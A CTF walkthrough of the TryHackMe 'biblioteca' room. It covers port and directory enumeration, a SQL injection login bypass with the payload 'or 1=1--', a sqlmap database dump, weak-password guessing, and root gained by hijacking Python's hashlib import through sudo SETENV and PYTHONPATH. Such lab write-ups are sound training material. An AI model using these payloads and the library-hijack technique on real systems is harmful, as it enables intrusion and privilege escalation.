---
title: biblioteca TryHackMe -- Writeup
date: 2022-05-21
categories: [TryHackMe, Medium]
tags: [sqli, mis-config, lib-hijacking]
---


# enumeration

```bash
nmap 10.10.193.163 -sCV -T4                                                                                130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-21 00:20 EDT
Nmap scan report for 10.10.193.163
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne

```
We got http server at 8000, seemingly a Flask app, and ssh (22) Lets check 8000 out.

## Gobuster

```bash
gobuster dir -u http://10.10.125.127:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.125.127:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/21 10:39:29 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 856]
/register             (Status: 200) [Size: 964]
/logout               (Status: 302) [Size: 218] [--> http://10.10.125.127:8000/login]
```
Apparently the username and password fields are vulnerable to sql-injection. At first i try the following payload `'or 1=1--'` and logged in as smokey (Nice)
Now i try using sqlmap to dump the database and see what is exactly in there.

## Initial Foothold

```bash
`sqlmap -u http://$ip:8000/login --data 'username=''&password=''' -D website --dump --level=1`

Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+

```
Luckily we go smokey password then use it to login ssh.

# User.txt

So now we smokey. But holup, this user cant read user.txt, urgh c'mon.. whatever
lets find our way to hazel

```bash
# as smokey
sudo -l
# literally nothing
```
Running linpeas shows nothing. LIKE WHAT AM I MISSING?.. Wait i remember there's a hint
for this flag. 'Weak password', Oh really?
I got stuck here for like 20mins trying literally every single thing i could possibly
think of.. Then i decided to ask for help.
Someone send me this link `https://www.youtube.com/watch?v=sQgd6MccwZc` as hint. and guess
what? it works lmao,.

## creds

`hazel:hazel` Yeah am stupid right?

## Flag
`THM{G0Od_*****************_p@sSw0rd$}`


# Root.txt

```bash
# as hazel
sudo -l

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py

```
SETENV basically allow us to set environmental variables. So what can we do with this exactly?
We have to look at the hasher.py file to understand where we can hijack the lib/module

```python
import hashlib # we gonna make this import our malicous file :D

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())
.
.
.
.
.
.
............
```
As you can see, we import hashlib at the start of the programming, So what we can do is
basically create our own malicious hashlib and set the path to point it, then we can execute
any python command as root, clever right?


```python
import os

os.system("whoami && ls /root") # to visualize the root folder structure

os.system("cat /root/root.txt") # output the flag

```

Save the above script at hashlib.py [I use /dev/shm] For some reasons i cant write to my
own home directory.. smh


## exploit

```python
sudo PYTHONPATH=/dev/shm /usr/bin/python3 /home/hazel/hasher.py
```
And voila, we root it.

## Flag
`THM{PytH0n_...........InG}`
<br>
<br>
<br>
Thanks for reading, I hope this helps.
